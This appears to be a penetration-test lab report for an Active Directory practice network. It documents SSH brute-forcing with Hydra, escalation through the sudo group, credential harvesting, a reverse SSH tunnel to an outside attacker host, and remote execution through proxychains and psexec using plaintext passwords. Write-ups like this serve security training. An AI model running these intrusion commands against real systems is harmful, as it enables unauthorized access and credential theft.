# Active Directory Set

**Port Scan Results**

+----------------+----------------------------------------------------------------------+
| **IP Address** | **Ports Open**                                                       |
+================+======================================================================+
| 10.4.4.10      | **TCP:** 22, 80                                                      |
+----------------+----------------------------------------------------------------------+
| 10.5.5.20      | **TCP:** 135, 139, 445, 3389                                         |
+----------------+----------------------------------------------------------------------+
| 10.5.5.30      | **TCP:** 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 3389 |
+----------------+----------------------------------------------------------------------+

## Ajla – 10.4.4.10

### Initial Access – Password Brute-Forcing

**Vulnerability Explanation:** The user account on the Ajla host was protected by a trivial password that was cracked within 5 minutes of brute-forcing. 

**Vulnerability Fix:** The SSH service should be configured to not accept password-based logins and the user account itself should contain a unique password not contained in the publicly available wordlists.

**Severity: [Critical]{ color="red" }**

**Steps to reproduce the attack:** rom the initial service scan John discovered that this host is called Ajla. After adding the target’s IP to the /etc/hosts file, the Hydra tool was run against the SSH service using the machine’s DNS name instead of its IP. With the extracted password at hand John was able to log in as ajla using SSH.

```
hydra -l ajla -P /home/kali/rockyou.txt -T 20 sandbox.local ssh
```

![](placeholder.png)

### Privilege Escalation – Sudo group

**Vulnerability Explanation:** sudo group allows any user in this group to escalate privileges to the root if they know the user’s password. 

**Vulnerability Fix:** The SSH service should be configured to not accept password-based logins and the user account itself should contain a unique password not contained in the publicly available wordlists.

**Severity: [Critical]{ color="red" }**

**Steps to reproduce the attack:** John spotted that the ajla user was a member of the sudo group immediately upon logging in and using the "id" command. And knowing user's password, he only needed to use a single command "sudo su" in order to obtain a root shell.

![](placeholder.png){ width=50% }

### Post-Exploitation

**System Proof screenshot:**

![](placeholder.png){ width=75% }

After collecting the proof files and establishing a backdoor using SSH, John began the enumeration of the filesystem for the presence of interesting files. He noticed that there was a mounted share originating from the 10.5.5.20 IP. Inspecting a custom sysreport.ps1 script in the /mnt/scripts directory he found cleartext credentials for the "sandbox\\alex" user. Taking into consideration the type of scripts in this directory and the username structure, it seems that the "Poultry" host is a part of the Active Directory environment.

![](placeholder.png)

John began the lateral movement by establishing a reverse dynamic port forwarding using SSH. First, he generated a new pair of SSH keys and added those to the authorized_keys file on his Kali VM, then he just needed to issue a single SSH port forwarding command:

```
ssh-keygen -t rsa -N '' -f ~/.ssh/key
ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" \
    -o "StrictHostKeyChecking=no" -I key kali@192.168.119.164
```

With the dynamic reverse tunnel established, John only needed to edit the /etc/proxychains.conf to use the port 1080.

## Poultry – 10.5.5.20

### Initial Access – RDP login

**Steps to reproduce the attack:** with the credentials at hand and a reverse tunnel established, John connected to an RDP session using proxychains accepting the certificate when prompted and entering the retrieved password afterward.

```
proxychains xfreerdp /d:sandbox /u:alex /v:10.5.5.20 +clipboard
```

### Post-Exploitation

**Local Proof Screenshot:**

![](placeholder.png){ width=75% }

John noticed the presence of the Thunderbird program on the user’s desktop, and while checking Alex’s inbox he found the email from a local administrator Roger:

![](placeholder.png){ width=75% }

## DC – 10.5.5.30

### Initial Access – Remote Commands Execution

**Steps to reproduce the attack:** John was able to reuse a temporary password that the administrator left for Alex.

```
proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py \
    admin:UWyBGeTp3Bhw7f@10.5.5.30
```

![](placeholder.png){ width=50% }

### Post-Exploitation

**System Proof Screenshot:**

![](placeholder.png){ width=75% }
